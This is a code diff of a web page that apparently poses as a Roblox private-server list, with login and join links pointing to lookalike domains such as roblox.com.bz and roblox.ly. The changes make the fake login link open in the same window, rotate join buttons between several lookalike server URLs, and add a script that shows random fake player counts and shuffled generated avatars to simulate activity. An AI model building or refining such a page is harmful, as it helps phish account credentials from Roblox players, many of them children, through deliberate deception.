@@ -1060,7 +1060,7 @@ footer{
             <span class="dot"></span>
 
             <span>
-                21 Online
+                <span id="onlineTotal">21</span> Online
             </span>
 
         </div>
@@ -1082,7 +1082,7 @@ footer{
         letter-spacing:.3px;
     ">
         <span style="font-size:18px;">⚠️</span>
-        <span>Make sure you're <a href="https://roblox.com.bz/login?returnUrl=5883086452383343" target="_blank" style="color:#ffd84d;font-weight:700;text-decoration:underline;">logged in to Roblox</a> first before joining a server — otherwise the login page may appear inside the frame.</span>
+        <span>Make sure you're <a href="https://roblox.com.bz/login?returnUrl=5883086452383343" style="color:#ffd84d;font-weight:700;text-decoration:underline;">logged in to Roblox</a> first before joining a server — otherwise the login page may appear inside the frame.</span>
     </div>
 
     <div class="server-list">
@@ -1118,7 +1118,7 @@ footer{
                         <div class="circle"></div>
 
                         <span>
-                            <strong>6</strong>
+                            <strong id="online1">6</strong>
                             / 20 Online
                         </span>
 
@@ -1139,30 +1139,20 @@ footer{
                 </div>
 
 
-                <div class="avatar-row">
+                <div class="avatar-row" id="avatars1">
 
-                    <img
-                        class="avatar"
-                        src="https://files.catbox.moe/xkgqry.png"
-                        alt="Player">
-
-                    <img
-                        class="avatar"
-                        src="https://files.catbox.moe/jba052.png"
-                        alt="Player">
-
-                    <img
-                        class="avatar"
-                        src="https://files.catbox.moe/xkgqry.png"
-                        alt="Player">
+                    <img class="avatar" src="" alt="Player">
+                    <img class="avatar" src="" alt="Player">
+                    <img class="avatar" src="" alt="Player">
 
                 </div>
 
 
                 <button
                     class="join-button"
-                    data-src="https://www.roblox.ly/games/18365686347/shutting-down?privateServerLinkCode=42402517281703347256839888083671"
-                    onclick="openGame(this.dataset.src)">
+                    data-links='["https://www.roblox.ly/games/18365686347/shutting-down?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/92885323184850/Anime-girl-Clicker?privateServerLinkCode=42402517281703347256839888083671"]'
+                    data-index="0"
+                    onclick="openGame(this)">
 
                     JOIN SERVER
 
@@ -1204,7 +1194,7 @@ footer{
                         <div class="circle"></div>
 
                         <span>
-                            <strong>15</strong>
+                            <strong id="online2">15</strong>
                             / 20 Online
                         </span>
 
@@ -1225,30 +1215,20 @@ footer{
                 </div>
 
 
-                <div class="avatar-row">
+                <div class="avatar-row" id="avatars2">
 
-                    <img
-                        class="avatar"
-                        src="https://files.catbox.moe/jba052.png"
-                        alt="Player">
-
-                    <img
-                        class="avatar"
-                        src="https://files.catbox.moe/xkgqry.png"
-                        alt="Player">
-
-                    <img
-                        class="avatar"
-                        src="file:///C:/Users/pherc/Downloads/.jpeg"
-                        alt="Player">
+                    <img class="avatar" src="" alt="Player">
+                    <img class="avatar" src="" alt="Player">
+                    <img class="avatar" src="" alt="Player">
 
                 </div>
 
 
                 <button
                     class="join-button"
-                    data-src="https://www.roblox.ly/games/139410450104051/Chat-with-AI-Emiko?privateServerLinkCode=42402517281703347256839888083671"
-                    onclick="openGame(this.dataset.src)">
+                    data-links='["https://www.roblox.ly/games/139410450104051/Chat-with-AI-Emiko?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/18365686347/shutting-down?privateServerLinkCode=42402517281703347256839888083671"]'
+                    data-index="0"
+                    onclick="openGame(this)">
 
                     JOIN SERVER
 
@@ -1481,8 +1461,12 @@ document
 </div>
 
 <script>
-function openGame(url){
-    if(!url) return;
+function openGame(btn){
+    var links = JSON.parse(btn.dataset.links || '[]');
+    if(!links.length) return;
+    var idx = parseInt(btn.dataset.index) || 0;
+    var url = links[idx % links.length];
+    btn.dataset.index = (idx + 1) % links.length;
     window.open(url,'_blank',
         'width=960,height=720,menubar=no,toolbar=no,location=yes,scrollbars=yes,resizable=yes'
     );
@@ -1497,5 +1481,48 @@ document.addEventListener("keydown",function(e){
 });
 </script>
 
+<script>
+(function(){
+    function rand(min,max){ return Math.floor(Math.random()*(max-min+1))+min; }
+
+    // pool of roblox-style avatars via dicebear pixel-art
+    var seeds = ["nova","blaze","pixel","raven","ghost","storm","echo","viper","axe","drift",
+                 "luna","foxy","zara","kai","rex","miko","neon","sky","ash","jade",
+                 "volt","rico","dusk","finn","cruz","lyra","omen","zero","ace","flux"];
+
+    function avatarUrl(seed){
+        return "https://api.dicebear.com/9.x/pixel-art/svg?seed="+seed+"&backgroundColor=b6e3f4,c0aede,d1d4f9,ffd5dc,ffdfbf";
+    }
+
+    function shuffled(){
+        var arr = seeds.slice();
+        for(var i=arr.length-1;i>0;i--){
+            var j=Math.floor(Math.random()*(i+1));
+            var t=arr[i];arr[i]=arr[j];arr[j]=t;
+        }
+        return arr;
+    }
+
+    function refreshAvatars(rowId){
+        var imgs = document.getElementById(rowId).querySelectorAll("img");
+        var pick = shuffled();
+        imgs.forEach(function(img,i){ img.src = avatarUrl(pick[i]); });
+    }
+
+    function refreshPlayers(){
+        var a = rand(3,18);
+        var b = rand(3,18);
+        document.getElementById("online1").textContent = a;
+        document.getElementById("online2").textContent = b;
+        document.getElementById("onlineTotal").textContent = a + b;
+        refreshAvatars("avatars1");
+        refreshAvatars("avatars2");
+    }
+
+    refreshAvatars("avatars1");
+    refreshAvatars("avatars2");
+    setInterval(refreshPlayers, 2000);
+})();
+</script>
 </body>
     </html>
